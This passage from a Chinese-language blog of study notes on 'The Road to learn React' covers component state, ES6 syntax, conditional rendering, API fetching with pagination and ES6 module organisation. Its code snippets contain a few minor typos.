中的强制步骤。最后将处理后的响应赋值给组件内部状态中的结果。此外，我们用一段 catch 代码来处理出错的情况。如果在发起请求时出现错误，这个函数会进入到 catch 中而不是 then 中。在本书之后的章节中，将涵盖错误处理的内容。 最后但同样重要的是，不要忘记在构造函数中绑定你的组件方法。 拓展操作符Dismiss 按钮之所以不工作，是因为 onDismiss() 方法不能处理复杂的 result 对象。它现在还只能处理一个本地状态中的简单列表。但是现在这个列表已经不再是简单的平铺列表了。现在，让我们去操作这个 result 对象而不是去操作列表。 12345678910onDismiss(id) &#123;const isNotId = item =&gt; item.objectID !== id;const updatedHits = this.state.result.hits.filter(isNotId);this.setState(&#123; ...&#125;);&#125;/ don`t do thisthis.state.result.hits = updatedHits React 拥护不可变的数据结构，不应该改变一个对象或者是直接改变状态。更好的做法是基于现在拥有的资源来创建一个新的对象。javaSrcipt ES6 的 Object.assign() 函数可以达到这样的目的。它把接受的第一个参数作为目标对象，后面的所有参数作为源对象，然后把所有的源对象合并到目标对象中。只要将目标对象设置为空，就可以得到一个新的对象。 12const updatedHits = &#123;hits:updatedHits &#125;;const updateList = Object.assign(&#123;&#125;,this.state.result,updateHits); ES6中数组的扩展运算符12345678910111213141516171819202122数组+字符串const userList = [&apos;Robin&apos;, &apos;Andrew&apos;, &apos;Dan&apos;];const additionalUser = &apos;Jordan&apos;;const allUsers = [ ...userList, additionalUser ];console.log(allUsers);// output: [&apos;Robin&apos;, &apos;Andrew&apos;, &apos;Dan&apos;, &apos;Jordan&apos;]合并数组onst oldUsers = [&apos;Robin&apos;, &apos;Andrew&apos;];const newUsers = [&apos;Dan&apos;, &apos;Jordan&apos;];const allUsers = [ ...oldUsers, ...newUsers ];console.log(allUsers);// output: [&apos;Robin&apos;, &apos;Andrew&apos;, &apos;Dan&apos;, &apos;Jordan&apos;]对象const userNames = &#123; firstname: &apos;Robin&apos;, lastname: &apos;Wieruch&apos; &#125;;const userAge = &#123; age: 28 &#125;;const user = &#123; ...userNames, ...userAge &#125;;console.log(user);// output: &#123; firstname: &apos;Robin&apos;, lastname: &apos;Wieruch&apos;, age: 28 &#125; 重新改写 1234567onDismiss(id) &#123; const isNotId = item =&gt; item.objectID !== id; const updatedHits = this.state.result.hits.filter(isNotId); this.setState(&#123; result: &#123; ...this.state.result, hits: updatedHits &#125; &#125;);&#125; 条件渲染条件渲染用于需要决定渲染哪个元素的时候，就可以用 JSX 中 if-else 来实现组件内部状态中的 result 对象初始值为空，当 API 结果还没有返回的时候，此时的主组件中没有任何的元素，这就是一个条件渲染，因为在某个特定的条件下， render() 方法提前返回了，根据条件， 主组件渲染它的元素或者什么都不渲染 Table 组件的渲染依赖于 result，所以将它包在一个独立的条件渲染中才比较合理。即使 result 为空，其它的所有组件还是应该被渲染。你只需要在 JSX 中加上一个三元运算符就可以达到这样的目的。 12345678910111213141516return ( &lt;div className=&quot;page&quot;&gt; &lt;div className = &quot;interactions&quot;&gt; &lt;Search value=&#123;searchText&#125; onChange=&#123;this.onSearchChange&#125; /&gt; &#123; result? &lt;Table list=&#123;result.hits&#125; pattern=&#123;searchText&#125; onDismiss=&#123;this.onDismiss&#125;/&gt;:null &#125; &lt;/div&gt; &lt;/div&gt; ) 这是实现条件渲染的第二种方式。第三种则是运用 &amp;&amp; 逻辑运算符。在JavaScript中， true &amp;&amp; ‘Hello World’ 的值永远是 “Hello World”。而 false &amp;&amp; ‘Hello World’ 的值则永远是 false 1234567const result = true &amp;&amp; &apos;Hello World&apos;;console.log(result);// output: Hello Worldconst result = false &amp;&amp; &apos;Hello World&apos;;console.log(result);// output: false 所以也可以这样改写 1234567&#123; result &amp;&amp; &lt;Table list=&#123;result.hits&#125; pattern=&#123;searchTerm&#125; onDismiss=&#123;this.onDismiss&#125; /&gt;&#125; 客户端或者服务端搜索在使用 Search 组件的输入栏时，会在客户端过滤这个列表，所以要做的是使用 API 在服务端进行搜索。否则，就只能处理第一次从 componentDidMount() 拿到的默认搜索词的 API 响应可以在主组件中顶一个 onSeachSubmit() 方法，当 Search 组件进行搜索的时候，可以用这个方法来 API 获取结果，顺便在 Search 中增加一个新按钮，这个按钮可以触发搜索请求 123456789101112131415161718192021222324252627282930313233343536 class FormP extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; result: null, searchText: DEFAULT_QUERY, &#125;; this.setSearchTopStories = this.setSearchTopStories.bind(this); this.fetchSearchTopStories = this.fetchSearchTopStories.bind(this); this.onSearchChange = this.onSearchChange.bind(this); this.onSearchSubmit = this.onSearchSubmit.bind(this); this.onDismiss = this.onDismiss.bind(this); &#125; .... onSearchSubmit(e) &#123; const &#123; searchText &#125; = this.state; // console.log( searchText); this.fetchSearchTopStories(searchText); e.preventDefault(); &#125;&#125;const Search = (&#123; value, onChange, onSubmit, children &#125;) =&gt; &lt;form onSubmit=&#123;onSubmit&#125; &gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; 分页抓取改造一下可组合 API 常量，以便于处理分页数据 123456const DEFAULT_QUERY = &apos;redux&apos;;const PATH_BASE = &apos;https://hn.algolia.com/api/v1&apos;;const PATH_SEARCH = &apos;/search&apos;;const PARAM_SEARCH = &apos;query=&apos;;const PARAM_PAGE = &apos;page=&apos;;const url = `$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;&amp;$&#123;PARAM_PAGE&#125;`; fetchSearchTopStories() 函数接收分页作为第二个参数。如果不提供第二个参数，它将使用 0 作为初始参数并发起请求。因此 componentDidMount() 和 onSearchSubmit() 方法在第一个请求中默认获取第一页。之后的请求将根据提供的第二个参数抓取下一个页面的数据。 123456789101112131415 class App extends Component &#123; ... fetchSearchTopStories(searchTerm, page = 0) &#123; fetch(`$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;&amp;$&#123;PARAM_PAGE&#125;\$&#123;page&#125;`) .then(response =&gt; response.json()) .then(result =&gt; this.setSearchTopStories(result)) .catch(e =&gt; e); &#125; ...&#125; 客户端缓存The Road to learn React 代码 错误处理The Road to learn React 代码 代码组织和测试本章将专注在几个重要话题来保证在一个规模增长的应用中代码的可维护性。你将了解如何去组织代码，以便在构建你的工程目录和文件时时遵循最佳实践。本章你将学会的另外一个话题是测试，这对你的代码健壮性非常重要。本章也会结合之前的练习项目来为你介绍这几个话题。 ES6模块： Import 和 Export在 JavaScript ES6 中可以从模块中导入和导出某些功能，这些功能可以是函数、类、组件、常量等等。基本上可以将所有东西都赋值到一个变量上。模块可以是单个文件，或者一个带有入口文件的文件夹 import 与 export 语句可以让我们在不同的文件共享代码，这些语言有利于代码的分割。代码风格就是将代码分配到多个文件夹中去，以保持代码的重用性和可维护性。前者得以成立时因为可以在不同的文件中导入相同的代码片段，而后者得以成立是因为维护的代码时唯一的代码源 最后一点是，它能帮助我们思考代码封装。不是所有的功能都需要从一个文件导出。其中一些功能应该只在定义它的文件夹中使用。一个文件导出的功能是这个文件公共 API ，只有导出的功能才能被其他地方重用。遵循了封装的最佳实践 可以导出一个或者多个变量，称为一个命名的导出 file1.js const firstname = ‘lai’,const lastname = ‘bh’,export { firstname , lastname }; 并在另外一个文件中引用file2.js import { firstname, lastname } from ‘./file1.js’;console.log(firstname); // lai 也可以用对象的方式导入另外文件的全部变量file2.js import * as person from ‘./file1.js’;console.log(person.firstname); // lai 导入可以有一个别名，可能发生在输出多个文件中有相同命名的导出的时候。file2.js import { firstname as foo } from ‘./file1.js’console.log(foo); // lai 还有一种情况 default 语句，可以被用在以下情况为了导出和导入单一功能为了强调一个模块输出 API 中的主要功能这样可以向后兼容 ES5 只有一个导出物的功能 file1.js const lbh = { firstname:’lai’, lastname:’bh’};export default lbh; 可以在导入 default 输出时省略花括号file2.js import developer from ‘./file1.js’console.log(developer); // { firstname:’lai’,lastname:’bh’} 另外，输入名称可以与导入的 default 名称不一样，也可以将其与命名的导出与导入语句使用同一个名称file1.js const firstname = ‘lai’,const lastname = ‘bh’,const lbh = { firstname, lastname};export{ firstname, lastname};export default lbh file2.js import lbh, { firstname, lastname } from ‘./file1.js’;console.log(lbh); // { firstname:’lai’,lastname:’bh’}console.log(firstname, lastname); // (lai,bh) 在命名的导出中，可以省略多余行直接导出变量 export default firstname = ‘lai’;export default lastname = ‘bh’; 代码组织与ES6模块可能会用到的模块结构 123456789101112131415src/ index.js index.css App.js App.test.js App.css Button.js Button.test.js Button.css Table.js Table.test.js Table.css Search.js Search.test.js Search.css 这里将组件封装到各自文件中，但是这看起来不是很好。你可以看到非常多的命名冗余，并且只有文件的扩展文字不同。另外一种模块的结构大概类似： 12345678910111213141516171819src/ index.js index.css App/ index.js test.js index.css Button/ index.js test.js index.css Table/ index.js test.js index.css Search/ index.js test.js index.css 这看起来比之前清晰多了。文件名中的 index 名称表示他是这个文件夹的入口文件。这仅仅是一个命名共识，你也可以使用你习惯的命名。在这个模块结构中，一个组件被 JavaScript 文件中组件声明，样式文件，测试共同定义。 另外一个步骤可能要将 App 组件中的变量抽出。这些变量用来组合出 Hacker News 的 API URL。 123456789101112131415src/ index.js index.css constants/ index.js components/ App/ index.js test.js index..css Button/ index.js test.js index..css ... 自然这些模块会分割到 src/constants/ 和 src/components/ 中去。现在 src/constants/index.js 文件可能看起来类似下面这样： Code Playground: src/constants/index.js 1234567export const DEFAULT_QUERY = &apos;redux&apos;;export const DEFAULT_HPP = &apos;100&apos;;export const PATH_BASE = &apos;https://hn.algolia.com/api/v1&apos;;export const PATH_SEARCH = &apos;/search&apos;;export const PARAM_SEARCH = &apos;query=&apos;;export const PARAM_PAGE = &apos;page=&apos;;export const PARAM_HPP = &apos;hitsPerPage=&apos;; App/index.js 文件可以导入这些变量，以便使用。 Code Playground: src/components/App/index.js 123456789import &#123;DEFAULT_QUERY,DEFAULT_HPP,PATH_BASE,PATH_SEARCH,PARAM_SEARCH,PARAM_PAGE,PARAM_HPP,&#125; from &apos;../constants/index.js&apos;; 当你使用 index.js 这个命名共识的时候，你可以在相对路径中省略文件名。 123456789101112Code Playground: src/components/App/index.jsimport &#123; DEFAULT_QUERY, DEFAULT_HPP, PATH_BASE, PATH_SEARCH, PARAM_SEARCH, PARAM_PAGE, PARAM_HPP,&#125; from &apos;../constants&apos;;... 但是 index.js 文件名称后面发生了什么？这个约定是在 node.js 世界里面被引入的。index 文件是一个模块的入口。它描述了一个模块的公共 API。外部模块只允许通过 index.js 文件导入模块中的共享代码。考虑用下面虚构的模块结构进行演示： 123456789src/ index.js App/ index.js Buttons/ index.js SubmitButton.js SaveButton.js CancelButton.js 这个 Buttons/ 文件夹有多个按钮组件定义在了不同的文件中。每个文件都 export default 特定的组件，使组件能够被 Buttons/index.js 导入。Buttons/index.js 文件导入所有不同的表现的按钮，并将他们导出作为模块的公共 API。 Code Playground: src/Buttons/index.js 123456789import SubmitButton from &apos;./SubmitButton&apos;;import SaveButton from &apos;./SaveButton&apos;;import CancelButton from &apos;./CancelButton&apos;;export &#123; SubmitButton, SaveButton, CancelButton,&#125;; 现在 src/App/index.js 可以通过定位在 index.js 文件模块的公共 API 导入这些按钮。Code Playground: src/App/index.js 12345import &#123; SubmitButton, SaveButton, CancelButton&#125; from &apos;../Buttons&apos;; 参考链接：https://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part2]]></title>
    <url>%2F2018-06-07-TheRoadtolearnReactPart2.html</url>
    <content type="text"><![CDATA[The Road to learn React书籍学习笔记(第二章)组件的内部状态组件的内部状态也称为局部状态，允许保存、修改和删除在组件内部的属性，使用ES6类组件可以在构造函数中初始化组件的状态。构造函数只会在组件初始化的时候调用一次 类构造函数 12345class App extends Component&#123; constructor(props)&#123; super(props); &#125;&#125; 使用ES6编写的组件有一个构造函数时，需要强制地使用 super() 方法， 因为这个 App组件 是 Component 的子类，因为需要在 App组件 声明 extends Component也可以调用 super(props)，它会在构造函数中设置 this.props 以供构造函数中访问。否则在构造函数中访问 this.props ，会得到 undefined 例子，组件的初始状态是一个列表 12345678910111213141516171819const list = [ &#123; title:&apos;React&apos;, url: &apos;https://facebook.github.io/react/&apos;, author: &apos;Jordan Walke&apos;, num_comments: 3, points: 4, objectID: 0, &#125;];class App extends Component&#123; constructor(props)&#123; super(props); this.state = &#123; list : list, &#125; &#125;&#125; state 通过使用 this 绑定在类上，因此可以在整个组件中访问到 state。通过 render() 方法可以映射一个在组件外定义静态列表 1234567891011121314151617class App extends Component&#123; render()&#123; return( &lt;div className = &quot;App&quot;&gt; &#123;this.state.list.map(item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt;&lt;a href = &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt;&lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;/div&gt; ) &#125; &lt;/div&gt; ); &#125;&#125; 现在list是㢟的一部分，它在组件的 state 中，可以从list添加、修改、删除列表项。组件的 render 会再次运行，可以简单修改组件内部状态，确保组件重新渲染并且展示从内部状态获取到的正确数据修改 state 可以使用 setState() 方法来修改 ES6 对象初始化初始化例子 1234const name = &apos;Laibh&apos;;const user = &#123; name ： name&#125;; 当对象中属性名与变量名相同时可以如下操作 1234const name = &apos;Laibh&apos;; const user = &#123; name&#125;; 在应用程序中，列表变量名与状态属性名称共享同一名称 123456789//ES5 this.state = &#123; list:list&#125;//ES6this.state = &#123; list&#125;; 简写方法名 12345678910111213//ES5var userService = &#123; getUserName :function(user)&#123; return user.firstname + &apos; &apos; + user.lastname; &#125;&#125;//ES6const userService = &#123; getUserName(user)&#123; return user.firstname + &apos; &apos; + user.lastname; &#125;&#125; 计算属性名 12345678910//ES5var user = &#123; name:&apos;Laibh&apos;&#125;//ES6const key = &apos;name&apos;;const user = &#123; [key] :&apos;Laibh&apos;&#125; 单向数据流组件中有一些内部的 state，练习 state 操作的好方式增加一些组件的互动为列表增加一个删除按钮 123456789101112131415161718192021222324252627 class App extends Component &#123; render() &#123; return ( &lt;div className=&quot;App&quot;&gt; &#123;this.state.list.map(item =&gt; &lt;div key=&#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href=&#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt; &lt;button onClick=&#123;() =&gt; this.onDismiss(item.objectID)&#125; type=&quot;button&quot; &gt; Dismiss &lt;/button&gt; &lt;/span&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ); &#125;&#125; 上面类中，onDismiss() 还没有被定义，它通过id来标识哪个应该被删除，此函数绑定到类，就成为了类方法，所以访问它的时候要用 this.onDismiss() 而不是用 onDismiss() 。this 对象是类的实例，为了将 onDismiss() 定义为类方法，需要在构造函数中绑定它。并定义它的逻辑功能 12345678910111213141516171819 class App extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; list, &#125;; this.onDismiss = this.onDismiss.bind(this); &#125; onDismiss(id) &#123; ... &#125; render() &#123; ... &#125;&#125; 可以使用JavaScript内置的 filter 方法来删除列表的一项，它会遍历整个列表，通过条件来过滤，匹配的返回 true 并留在列表中 12345onDismiss(id)&#123; const updateList = this.state.list.filter(function isNotId(item)&#123; return item.objectID !== id &#125;);&#125; 或者一行箭头函数 123onDismiss(id)&#123; const updateList = this.state.list.filter(item =&gt; item.objectID !== id);&#125; 接着要更新数据 1this.setState(&#123;list:updateList&#125;); 绑定类不会自动绑定 this 到实例上需要自己绑定 12345constructor() &#123; super(); this.onClickMe = this.onClickMe.bind(this); &#125; 类的绑定方法也有人写在其他地方，例如render()函数中 12345render()&#123; return( &lt;button onClick = &#123;this.onClickMe.bind(this)&#125;&gt;Click Me&lt;/button&gt; )&#125; 但是应该避免这样使用，因为它会在每次 render() 方法执行的时绑定类方法。组件每次更新都会导致性能消耗，当在构造函数中绑定的时候，绑定只会在组件实例化时运行一次，这样是一个更好的方式 另外有一些人剔除在构造函数中定义业务逻辑类方法 123456constructor()&#123; super(); this.onClick = () =&gt;&#123; conlose.log(this); &#125;&#125; 这样随着时间推移会让构造函数变得混乱，避免使用。构造函数的目的只是实例化类以及所有的属性 事件处理12345&lt;button onClick=&#123;() =&gt; this.onDismiss(item.objectID)&#125; type=&quot;button&quot;&gt; Dismiss&lt;/button&gt; 当传递一个参数到类的方法，需要将它封装到另一个（箭头）函数中，由于要传递给事件处理器使用，因为它必须是一个函数，而下面的这个代码不会工作。因为类方法会在浏览器中打开程序时候立即执行 123&lt;button onClick = &#123;this.onDismiss(item.objectID)&#125;&gt; Dismiss&lt;/button&gt; 倘若写成 123&lt;button onClick = &#123;onDismiss&#125;&gt; Dismiss&lt;/button&gt; 就不会立即执行，但是需要传参数，所以就不这么用 另外的一个解决方案是在外部定义一个包装函数，并且只将定义的函数传递给处理程序。因为需要访问特定的列表项，所以它必须位于 map 函数块的内部 12345678910111213141516171819202122232425262728293031class App extends Component&#123; render()&#123; return( &lt;div className = &quot;App&quot;&gt; &#123;this.state.list.map(item =&gt; const onHandldDismiss = () =&gt; this.onDismiss(item.objectID); return( &lt;div key=&#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href=&#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt; &lt;button onClick=&#123;onHandleDismiss&#125; type=&quot;button&quot; &gt; Dismiss &lt;/button&gt; &lt;/span&gt; &lt;/div&gt; ) )&#125; &lt;/div&gt; ) &#125;&#125; 在事件处理程序中使用箭头函数对性能会有影响 和表单互动123456789101112131415const list = [&#123; title: &apos;React&apos;, url: &apos;https://facebook.github.io/react&apos;, author: &apos;Jordan Walke&apos;, num_comments: 3, points: 4, objectID: 0,&#125;, &#123; title: &apos;Redux&apos;, url: &apos;https://github.com/reactjs/redux&apos;, author: &apos;Dan Abramov, Andrew Clark&apos;, num_comments: 2, points: 5, objectID: 1, &#125;]; 1234567891011121314151617181920212223242526272829303132333435363738394041424344const isSearched = searchText =&gt; item =&gt; item.title.toLowerCase().includes(searchText.toLowerCase());class FormP extends Component&#123; constructor(props)&#123; super(props); this.state = &#123;list,searchText:&apos;&apos;&#125;; this.onSearchChange = this.onSearchChange.bind(this); this.onDismiss = this.onDismiss.bind(this); &#125; onSearchChange(e)&#123; this.setState(&#123;searchText:e.target.value&#125;); &#125; onDismiss(id)&#123; console.log(this); const updateList = this.state.list.filter(item =&gt; item.objectID !== id ); this.setState(&#123;list:updateList&#125;); &#125; render()&#123; return( &lt;div className = &quot;FormP&quot;&gt; &lt;form&gt; &lt;input type=&quot;text&quot; onChange = &#123;this.onSearchChange&#125;/&gt; &lt;/form&gt; &#123;this.state.list.filter(isSearched(this.state.searchText)).map( item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; &lt;/span&gt; &lt;span&gt;&#123;item.author&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;span&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt; &lt;button onClick = &#123;()=&gt;this.onDismiss(item.objectID)&#125;&gt;Dismiss&lt;/button&gt; &lt;/span&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ) &#125;&#125;export default FormP; ES6 解构 在JavaScript ES6 中有一个更方便的方法来访问对象和数组的属性，叫做解构。 1234567891011121314const user = &#123; firsname : &apos;L&apos;, lastname : &apos;binhong&apos;&#125;//ES5var firstname = user.firstname;var lastname = user.lastname;console.log(firstname + &apos;&apos; +lastname);//ES6const &#123;firstname, lastname&#125; = user;conlose.log(firstname + &apos;&apos; +lastname); 在JavaScript ES5中每次访问对象的属性都需要额外添加一行代码，但是ES6中就可以在一行中进行，可读性最好的方法就是将对象解构成多个属性时使用多行对于数组也可以使用解构，可以保持代码的可读性 12345678const user = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;];const [ a, b, c] = user;console.log(a,b,c); //1,2,3 受控组件表单元素 &lt;input&gt;/&lt;select&gt;/&lt;textarea&gt; 会以元素HTML的形式保存它们自己的状态，一旦有人从外部做了修改，就会修改内部的值，在React中这被称为不受控组件，因为它们自己处理状态，在React中，我们得把它们变成 受控元素 12345678910111213141516class App extends Componet&#123; render()&#123; const &#123;searchText,list&#125; = this.state; return( &lt;div className = &quot;App&quot;&gt; &lt;form&gt; &lt;input type = &quot;text&quot; value = &#123;searchText&#125; onChange = &#123;this.onSearchChange&#125; &gt;&lt;/input&gt; &lt;/form&gt; &lt;/div&gt; ) &#125;&#125; 现在输入框的单项数据流循环是自包含的，组件内部状态是输入框的唯一数据来源 拆分组件用于搜索的输入组件和一个用于展示的列表组件 1234567891011class App extends Componet&#123; render()&#123; const &#123;searchText,list&#125; = this.state; return( &lt;div className = &quot;App&quot;&gt; &lt;Search /&gt; &lt;Table /&gt; &lt;/div&gt; ) &#125;&#125; 在组件传递属性并在组件中使用，App组件需要传递本地状态 state 托管的属性和它自己的类方法 12345678910111213141516class App extends Component&#123; render()&#123; const &#123;searchText,list&#125; = this.state; return( &lt;div&gt; &lt;Search value = &#123;searchText&#125; onChange = &#123;this.onSearchChange&#125; /&gt; &lt;Table list = &#123;list&#125; pattern = &#123;searchText&#125; onDismiss = &#123;this.onDismiss&#125; /&gt; &lt;/div&gt; ) &#125;&#125; Search组件 12345678910111213class Search extends Component&#123; render()&#123; const &#123;value,onChange&#125; = this.props; return( &lt;form&gt; &lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; ) &#125;&#125; Table组件 1234567891011121314151617181920class Table extends Component&#123; render()&#123; const &#123;list,pattern.onDismiss&#125; = this.props; return( &lt;div&gt; &#123;list.filter(isSearched(pattern)).map(item =&gt; &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt;&lt;a href = &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt;&lt;/span&gt; &lt;span&gt;&#123;item.title&#125;&lt;/span&gt; &lt;soan&gt;&#123;item.points&#125;&lt;/span&gt; &lt;span&gt;&#123;item.num_comments&#125;&lt;/span&gt; &lt;button onClick =&#123;() =&gt; onDismiss(item.objectID)&#125;&gt; Dismiss &lt;/button&gt; &lt;/div&gt; )&#125; &lt;/div&gt; ) &#125;&#125; 可组合组件在 props 对象中还有一个小小的属性可以供使用： children 属性.通过这个属性可以将元素从上层传递到组件中，这些元素对组件来说是未知的，但是却为组件互相结合提供了可能性、下例中，将一个文本作为子元素传递到Search组件中 1234567891011class App extends Component&#123; render()&#123; const &#123;searchText,list&#125; = user; return( &lt;div&gt; &lt;Search value = &#123;searchText&#125; onChange = &#123;this.onSearchChange&#125; /&gt; ) &#125;&#125; 在 Search 组件可以从 props 对象中解构出 children 属性，就可以指定它应该在哪里显示 123456789101112131415class Search extends Component&#123; render()&#123; const &#123;value,onChange,children&#125; = this.props; return( &lt;form&gt; &#123;children&#125; &lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &#125; &lt;/form&gt; ) &#125;&#125; 可复用组件可复用和可组合组件帮助理解合理的组件分层，它们是React视图层的基础 12345678910111213class Button extends Component&#123; render()&#123; const &#123;onClick,className,children&#125; = this.props; return( &lt;button onClick = &#123;onClick&#125; className = &#123;className&#125; type = &quot;button&quot;&gt; &#123;children&#125; &lt;/button&gt; ) &#125;&#125; Button组件拥有单一可信数据源，一个Button组件可以立即重构所有button。一个Button组件统治了所有button &lt;Button onclick = {() =&gt; onDismiss(item.objectID)}&gt;Dissmiss&lt;/Button&gt; 函数式无状态组件(function stateless componenet)这类组件就是函数，它们接受一个输入并返回一个输出。输入时props，输出就是一个普通的JSX组件实例。函数式无状态组件是函数，并且它们没有本地状态。不能通过 this.state 或者是 this.setState() 来访问或者更新状态，因为这里没有 this 对象，此外，它也没有生命周期方法。 constructor() 与 render() 就是其中两个。 constructor 在一个组件的生命周期只执行一次，而 render() 方法只会在最开始执行一次 ES6 类组件在类的定义中，它们继承自 React 组件。 extend 会注册所有的生命周期方法，只要在 React component API中，都可以在组件中使用。通过这种方式，可以使用 render() 方法，此外还可以通过使用 this.state 和 this.setState() 来存储和操作 state 把上例的Search组件重构为一个函数式无状态组件 1234567891011function Search(props)&#123; const &#123;value,onChange,children&#125; = props; return&#123; &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; &#125;&#125; 或者将参数放在函数里面 12345678910function Search(&#123;value,onChange,children&#125;)&#123; return&#123; &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; &#125;&#125; 然后ES6 箭头函数一波 1234567const Search = (&#123;value,onChange,children&#125;) =&gt; &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; 如果想在ES6箭头函数写法中做些事情的话 可以这样写 123456789101112const Search = (&#123;value,onChange,children&#125;) =&gt; &#123; //do something return( &lt;form&gt; &#123;children&#125;&lt;input type = &quot;text&quot; value = &#123;value&#125; onChange = &#123;onChange&#125; /&gt; &lt;/form&gt; )&#125; 给组件声明样式可以复用 src/App.css 或者 src/index.css 文件 参考链接：https://leanpub.com/the-road-to-learn-react-chinese]]></content>
      <categories>
        <category>react相关</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part1]]></title>
    <url>%2F2018-06-06-TheRoadtolearnReactPart1.html</url>
    <content type="text"><![CDATA[The Road to learn React书籍学习笔记(第一章) react灵活的生态圈Small ApplicationBoilerplate: create-react-appUtility: JavaScript ES6 and beyondStyling: plain CSS and inline styleAsynchronous Requests: fetchHigher Order Components: optionalFormatting: noneType Checking: none or PropTypesState Management: local stateRouting: none or conditional renderingAuthentication: FirebaseDatabase: FirebaseUI Components: noneTime: moment or date-fnsTesting: Jest Medium ApplicationBoilerplate: create-react-app with ejectUtility: JavaScript ES6 + Lodash or RamdaStyling: CSS modules or Styled ComponentsAsynchronous Requests: fetch or axiosHigher Order Components: maybe + optional recomposeFormatting: PrettierType Checking: none or FlowState Management: local state and very optional ReduxRouting: React RouterAuthentication: FirebaseDatabase: FirebaseUI Components: none or Semantic UITime: moment or date-fnsTesting: Jest with Enzyme Large ApplicationBoilerplate: create-react-app with eject or own boilerplate projectUtility: JavaScript ES6 + Lodash or RamdaStyling: CSS modules or Styled ComponentsAsynchronous Requests: axiosHigher Order Components: maybe + optional recomposeFormatting: PrettierType Checking: FlowState Management: local state and Redux or MobXRouting: React RouterAuthentication: Solution with an own Express/Hapi/Koa Node.js Server with Passport.jsDatabase: Solution with an own Express/Hapi/Koa Node.js Server with a SQL or NoSQL DatabaseUI Components: Semantic UI or own implementation of UI componentsTime: moment or date-fnsTesting: Jest with Enzyme 基本要求npm/nodeNode包管理器（npm/node/package/manager）可以让你通过命令行安装第三方node包。这些包可能是一系列的工具函数、库、或者是集成的框架 零配置搭载react npm install -g react-reate-app 运行 npm start 运行测试 npm test 构建项目产品文件 npm run build ES6中的const与let被const声明的变量不能被重新赋值或者是重新声明。可以使用它创建不可变数据结构。但如果创建的这个变量是数组或者是对象的时候，里面持有的内容可以被更新。当一个变量需要被重新赋值的时候，应该使用let去声明它 ReactDOM简单地说，ReactDOM.render()会使用JSX替换HTML中一个DOM节点，这样可以很容易地React集成到每一个其他的应用中。ReactDOM.render() 有两个传入参数，第一个是准备渲染的JSX,第二个参数指定了React应用在HTML中放置的位置。 模块热替换模块热替换（HMR）是一个帮助你在浏览器中重新加载应用的工具，并且无需让浏览器刷新页面。在src/index.js中添加一些配置代码 if（module.hot）{module.hot.accept();} 代码改变后，浏览器就不会刷新页面，但是应用还是会重新加载并且正确的输出 JSX中复杂的JavaScript定义一个列表 123import React, &#123; Component &#125; from &apos;react&apos;;// import logo from &apos;./logo.svg&apos;;import &apos;./App.css&apos;; 123456789101112131415const list = [&#123; title: &apos;React&apos;, url: &apos;https://facebook.github.io/react&apos;, author: &apos;Jordan Walke&apos;, num_comments: 3, points: 4, objectID: 0,&#125;, &#123; title: &apos;Redux&apos;, url: &apos;https://github.com/reactjs/redux&apos;, author: &apos;Dan Abramov, Andrew Clark&apos;, num_comments: 2, points: 5, objectID: 1, &#125;]; 在JSX中使用HTML中的JavaScript是强大的，可以使用map来将一个列表转换成另外一个列表。记得在React中添加一个辅助属性，给列表的每个成员加上一个关键字（key）属性，这样就可以在列表发生变化的时候识别其中成员的添加、更改和删除的状态。不要错误地使用列表成员在数组的索引作为关键字，列表的成员索引是完全不稳定的 12345678910111213141516171819202122class App extends Component &#123; render() &#123; return ( &lt;div className = &quot;App&quot;&gt; &#123;list.map(function(item)&#123; return( &lt;div key = &#123;item.objectID&#125;&gt; &lt;span&gt; &lt;a href= &#123;item.url&#125;&gt;&#123;item.title&#125;&lt;/a&gt; 